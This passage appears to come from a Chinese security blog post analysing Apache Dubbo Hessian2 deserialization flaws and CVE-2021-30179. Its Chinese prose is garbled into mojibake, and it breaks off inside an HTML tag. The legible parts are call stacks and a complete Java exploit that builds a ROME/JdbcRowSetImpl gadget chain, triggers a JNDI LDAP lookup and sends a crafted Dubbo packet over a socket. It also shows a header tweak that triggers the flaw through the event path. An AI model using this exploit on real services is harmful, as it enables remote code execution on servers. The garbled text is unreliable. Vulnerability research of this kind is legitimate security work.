ä½†æ˜¯æˆ‘ä»¬ä»ç„¶æœ‰ç€ç»•è¿‡çš„æ€è·¯</p><p>æ—¢ç„¶ä»–çš„æ–¹æ³•ååªèƒ½å¤Ÿæ˜¯è¿™ä¸ªï¼Œé‚£æˆ‘ä»¬å°±ä½¿å¾—æ–¹æ³•åç”¨ä»–ä»¬ä¸‰ä¸ªä¸­çš„ä¸€ä¸ªå°±è¡Œäº†</p><p>æ­¥éª¤ï¼š</p><p>å°†ä¸Šé¢ç¯å¢ƒä¸­çš„pom.xmlä¸­çš„ç‰ˆæœ¬æ”¹ä¸º2.7.7</p><p>ä¸”å°†comsumerç«¯çš„æ–¹æ³•åæ”¹ä¸ºäº†<code>$echo</code>ï¼Œä¹‹åè¿è¡Œ</p><p><img src="/2024/09/02/Dubbo/image-20240903170401145.png" alt="image-20240903170401145"></p><p><img src="/2024/09/02/Dubbo/image-20240903170409243.png" alt="image-20240903170409243"></p><h4 id="2-7-8"><a href="#2-7-8" class="headerlink" title="2.7.8"></a>2.7.8</h4><h5 id="æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–"><a href="#æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–" class="headerlink" title="æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–"></a>æ‰“é»˜è®¤Hessian2ååºåˆ—åŒ–</h5><p>åœ¨è¯¥ç‰ˆæœ¬ä¸­</p><p>åœ¨<code>isGenericCall</code> å’Œ <code>isEcho</code>ä¸­æœ‰äº†æ›´å¤šçš„é™åˆ¶</p><p><img src="/2024/09/02/Dubbo/image-20240903170607800.png" alt="image-20240903170607800"></p><p>é™åˆ¶äº†ä¹‹åå‚æ•°ç±»å‹ä¸º<code>Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;</code> æˆ–è€… <code>Ljava/lang/Object;</code> çš„æ—¶å€™æ‰ä¼šç»§ç»­è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚ä¸Šé¢çš„æ–¹æ³•å°±å¯„äº†ã€‚</p><p>ä½†æ¥ä¸‹æ¥çš„ååºåˆ—åŒ–å§¿åŠ¿å¯ä»¥ç›´æ¥ç”¨åˆ°2.7.13ï¼Œè°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>expect:<span class="hljs-number">3561</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readString:<span class="hljs-number">1883</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readUTF:<span class="hljs-number">89</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>decode:<span class="hljs-number">103</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">80</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>received:<span class="hljs-number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>run:<span class="hljs-number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)<br>runWorker:<span class="hljs-number">1149</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>è·Ÿé“¾å­ä¹Ÿå·ä¸ªæ‡’å§ï¼Œä¸ç„¶æˆ‘è¦å†™çˆ†äº†â€¦.</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.dubbo.spring.boot.demo.consumer;<br><br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.io.Bytes;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.Cleanable;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.apache.dubbo.common.utils.FieldUtils.setFieldValue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//ååºåˆ—åŒ–æ—¶ToStringBean.toString()ä¼šè¢«è°ƒç”¨ï¼Œè§¦å‘JdbcRowSetImpl.getDatabaseMetaData-&gt;JdbcRowSetImpl.connect-&gt;Context.lookup</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jndiUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xitdbc&quot;</span>;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        rs.setDataSourceName(jndiUrl);<br>        rs.setMatchColumn(<span class="hljs-string">&quot;foo&quot;</span>);<br><br><span class="hljs-comment">//ååºåˆ—åŒ–æ—¶EqualsBean.beanHashCodeä¼šè¢«è°ƒç”¨ï¼Œè§¦å‘ToStringBean.toString</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, rs);<br><br><span class="hljs-comment">//ååºåˆ—åŒ–æ—¶HashMap.hashä¼šè¢«è°ƒç”¨ï¼Œè§¦å‘EqualsBean.hashCode-&gt;EqualsBean.beanHashCode</span><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, item);<br><br><span class="hljs-comment">//HashMap.put-&gt;HashMap.putVal-&gt;HashMap.hash</span><br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, root, root, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, root, root, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br>        header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">2</span>);<br>        Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">hessian2ByteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2ObjectOutput</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2ObjectOutput</span>(hessian2ByteArrayOutputStream);<br>        out.writeObject(getPayload());<br><br>        out.flushBuffer();<br>        <span class="hljs-keyword">if</span> (out <span class="hljs-keyword">instanceof</span> Cleanable) &#123;<br>            ((Cleanable) out).cleanup();<br>        &#125;<br>        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, <span class="hljs-number">12</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        byteArrayOutputStream.write(header);<br>        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-meta">@SuppressWarnings( &quot;resource&quot;)</span><br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>( <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>) ;<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>        outputStream.write(bytes);<br>        outputStream.flush() ;<br>        outputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Hessian2-way-2"><a href="#Hessian2-way-2" class="headerlink" title="Hessian2 way 2"></a>Hessian2 way 2</h5><p>å¦ä¸€ç§åˆ©ç”¨æ–¹å¼å°±æ˜¯åœ¨Dubboåè®®è§£æçš„ä½ç½®</p><p><code>org.apache.dubbo.remoting.exchange.codec.ExchangeCodec#decode</code>æ–¹æ³•ä¸­</p><p><img src="/2024/09/02/Dubbo/image-20240903171016078.png" alt="image-20240903171016078"></p><p>Dubboæ ¼å¼ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903171032624.png" alt="image-20240903171032624"></p><p>å¼€å¤´çš„magicä½ç±»ä¼¼javaå­—èŠ‚ç æ–‡ä»¶é‡Œçš„é­”æ•°ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯ä¸æ˜¯dubboåè®®çš„æ•°æ®åŒ…ï¼Œé­”æ•°æ˜¯å¸¸é‡0xdabbï¼Œç”¨äºåˆ¤æ–­æŠ¥æ–‡çš„å¼€å§‹</p><p>å‡½æ•°åœ¨è§£ædubboåè®®æ—¶å…ˆåˆ¤æ–­è¯·æ±‚å¤´æ˜¯å¦æ˜¯é­”æœ¯å­—0xdabb</p><p>å½“é­”æœ¯å¤´æ ¡éªŒé€šè¿‡åï¼Œå°†ä¼šè°ƒç”¨<code>decodeBody</code>æ–¹æ³•</p><p><img src="/2024/09/02/Dubbo/image-20240903171113020.png" alt="image-20240903171113020"></p><p>å‡½æ•°è·å–flagæ ‡å¿—ä½ï¼Œä¸€å…±8ä¸ªåœ°å€ä½ã€‚</p><p>ä½å››ä½ç”¨æ¥è¡¨ç¤ºæ¶ˆæ¯ä½“æ•°æ®ç”¨çš„åºåˆ—åŒ–ç±»å‹ï¼ˆé»˜è®¤hessianï¼‰ï¼Œé«˜å››ä½ä¸­ï¼Œç¬¬ä¸€ä½ä¸º1è¡¨ç¤ºæ˜¯requestè¯·æ±‚ï¼Œç¬¬äºŒä½ä¸º1è¡¨ç¤ºåŒå‘ä¼ è¾“ï¼ˆå³æœ‰è¿”å›responseï¼‰ï¼Œç¬¬ä¸‰ä½ä¸º1è¡¨ç¤ºæ˜¯å¿ƒè·³äº‹ä»¶ã€‚è°ƒç”¨ç›¸åº”çš„ååºåˆ—åŒ–å‡½æ•°å¯¹æ•°æ®æµè¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p>å½“æœåŠ¡ç«¯åˆ¤æ–­æ¥æ”¶åˆ°çš„ä¸ºäº‹ä»¶æ—¶ï¼Œä¼šè°ƒç”¨<code>decodeHeartbeatData</code>ï¼Œè·Ÿè¿›å‘ç°è°ƒç”¨äº†<code>decodeEventData</code>æ–¹æ³•ï¼Œæ¥ç€è°ƒç”¨äº†ä¸€ä¸ª<code>in.readObject()</code>ï¼Œå†åˆ°<code>readObject()</code>ã€‚</p><p>ç¨å¾®å°†å‰é¢çš„payloadä¿®æ”¹ä¸€ä¸‹å°†flagç½®ä¸ºeventäº‹ä»¶å°±ä¼šè§¦å‘æ¼æ´</p><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">94</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>readEvent:<span class="hljs-number">83</span>, ObjectInput (org.apache.dubbo.common.serialize)<br>decodeEventData:<span class="hljs-number">400</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decodeBody:<span class="hljs-number">122</span>, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">122</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:<span class="hljs-number">82</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:<span class="hljs-number">48</span>, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">85</span>, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)<br>decodeRemovalReentryProtection:<span class="hljs-number">498</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>callDecode:<span class="hljs-number">437</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>channelRead:<span class="hljs-number">276</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>invokeChannelRead:<span class="hljs-number">379</span>, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">365</span>, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:<span class="hljs-number">357</span>, AbstractChannelHandlerContext (io.netty.channel)<br>channelRead:<span class="hljs-number">1410</span>, DefaultChannelPipeline$HeadContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">379</span>, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">365</span>, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:<span class="hljs-number">919</span>, DefaultChannelPipeline (io.netty.channel)<br>read:<span class="hljs-number">163</span>, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)<br>processSelectedKey:<span class="hljs-number">714</span>, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeysOptimized:<span class="hljs-number">650</span>, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeys:<span class="hljs-number">576</span>, NioEventLoop (io.netty.channel.nio)<br>run:<span class="hljs-number">493</span>, NioEventLoop (io.netty.channel.nio)<br>run:<span class="hljs-number">989</span>, SingleThreadEventExecutor$<span class="hljs-number">4</span> (io.netty.util.concurrent)<br>run:<span class="hljs-number">74</span>, ThreadExecutorMap$<span class="hljs-number">2</span> (io.netty.util.internal)<br>run:<span class="hljs-number">30</span>, FastThreadLocalRunnable (io.netty.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>payloadä¿®æ”¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br><span class="hljs-comment">//        header[2] = (byte) ((byte) 0x80 | 2);</span><br>header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">0x20</span> | <span class="hljs-number">2</span>);<br>Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><h4 id="2-7-9"><a href="#2-7-9" class="headerlink" title="2.7.9"></a>2.7.9</h4><p>é’ˆå¯¹ä¸Šä¸€ä¸ªç‰ˆæœ¬hessianåˆ©ç”¨æ–¹å¼ï¼Œå¯¹äº‹ä»¶è¿›è¡Œäº†é•¿åº¦é™åˆ¶ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903171400694.png" alt="image-20240903171400694"></p><p>åˆ¤æ–­äº†å¾…ååºåˆ—åŒ–çš„æ•°æ®é•¿åº¦æ˜¯å¦è¶…è¿‡é…ç½®çš„é˜ˆå€¼ï¼ˆé»˜è®¤ä¸º50ï¼‰ï¼Œå¦‚è¶…è¿‡åˆ™æŠ›å‡ºå¼‚å¸¸ï¼Œä¸å†ç»§ç»­ååºåˆ—åŒ–ï¼Œè¿™æ ·å°±å¯¼è‡´äº†ä¸Šé¢çš„way 2ä¸èƒ½å¤Ÿä½¿ç”¨äº†</p><p>ä½†æ˜¯ä¸Šé¢çš„ç¬¬ä¸€ç§æ–¹æ³•ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240903171423720.png" alt="image-20240903171423720"></p><h4 id="CVE-2021-30179"><a href="#CVE-2021-30179" class="headerlink" title="CVE-2021-30179"></a>CVE-2021-30179</h4><p>å½±å“ï¼š</p><p>Apache Dubbo <strong>2.7.0</strong> to <strong>2.7.9</strong></p><p>Apache Dubbo <strong>2.6.0</strong> to <strong>2.6.9</strong></p><p>å°è·Ÿä¸€ä¸‹ã€‚</p><p>æ ¹æ®å‰é¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“ï¼Œä¼šè°ƒç”¨<code>DecodeHandler#decode</code>æ–¹æ³•è¿›è¡Œå¤„ç†</p><p>ä¹‹ååœ¨<code>DecodeHandler#decode</code>æ–¹æ³•ä¸­å­˜åœ¨è¿‡æ»¤æ“ä½œï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240908000841134.png" alt="image-20240908000841134"></p><p>æ„ä¸ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">åˆ¤æ–­æ–¹æ³•åæ˜¯å¦ä¸ºinvokeæˆ–è€…invokeAsyncï¼Œdescæ˜¯å¦ä¸ºLjava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;ï¼Œå¦‚æœä¸æ»¡è¶³åˆ™ç›´æ¥æŠ›å‡ºå¼‚å¸¸<br><br>decodeå®Œæˆä¹‹åå°†è°ƒç”¨HeaderExchangeHandler.java#receivedæ–¹æ³•å¤„ç†è¯·æ±‚ï¼Œè‹¥ä¸ºæ³›å‹å¼•ç”¨ï¼Œåˆ™å°†è°ƒç”¨GenericFilter#invokeæ–¹æ³•<br></code></pre></td></tr></table></figure><p>åœ¨è·å–äº†æ–¹æ³•å&#x2F;ç±»å‹&#x2F;å‚æ•°ä¹‹åï¼Œå°†ä¼šé€šè¿‡åå°„è·å–è¯¥æ–¹æ³•ï¼Œå¦‚æœä¸å­˜åœ¨å°±ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>æ¥ä¸‹æ¥å°†é€šè¿‡è·å–è¯·æ±‚ä¸­çš„genericå‚æ•°æ¥é€‰æ‹©é€šè¿‡raw.return&#x2F;nativejava&#x2F;beanååºåˆ—åŒ–å‚æ•°æˆpojoå¯¹è±¡ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240908000942693.png" alt="image-20240908000942693"></p><p>1ã€å¦‚æœgenericä¸ºraw.returnæˆ–è€…trueï¼Œå°†è°ƒç”¨PojoUtils#realizeæ–¹æ³•</p><p><img src="/2024/09/02/Dubbo/image-20240908001012036.png" alt="image-20240908001012036"></p><p><img src="/2024/09/02/Dubbo/image-20240908001018546.png" alt="image-20240908001018546"></p><p>æ¥ç€è°ƒç”¨äº†<code>readlize</code> <code>realize0</code></p><p>åœ¨readlize0ä¸­çš„é€»è¾‘ä¸º</p><blockquote><p>è‹¥pojoä¸ºMapå®ä¾‹ï¼Œåˆ™ä»pojoï¼ˆä¹Ÿå°±æ˜¯ä¸€å¼€å§‹çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼‰è·å–keyä¸ºâ€œclassâ€çš„å€¼ï¼Œå¹¶é€šè¿‡åå°„å¾—åˆ°classæ‰€å¯¹åº”çš„ç±»typeï¼Œå†åˆ¤æ–­å¯¹è±¡çš„ç±»å‹è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†</p><p>å¦‚æœtypeä¸æ˜¯Mapçš„å­ç±»ã€ä¸ä¸ºObject.classä¸”ä¸æ˜¯æ¥å£ï¼Œåˆ™è¿›å…¥elseï¼Œåœ¨elseä¸­ï¼Œå¯¹typeé€šè¿‡åå°„è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œå¾—åˆ°å¯¹è±¡dest</p><p>å†å¯¹pojoè¿›è¡Œéå†ï¼Œä»¥é”®åä¸ºnameï¼Œå€¼ä¸ºvalueï¼Œè°ƒç”¨getSetterMethod(dest.getClass(), name, value.getClass());è·å–setæ–¹æ³•</p></blockquote><p><img src="/2024/09/02/Dubbo/image-20240908001114136.png" alt="image-20240908001114136"></p><p>ï¼Œä¹‹åå°±å¯ä»¥é€šè¿‡<code>org.apache.xbean.propertyeditor.JndiConverter</code>ç±»ä¸­çš„<code>setAsText</code>æ–¹æ³•è¿›è¡ŒJNDIæ³¨å…¥ã€‚</p><p>çœ‹ä¸€æ‰‹è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 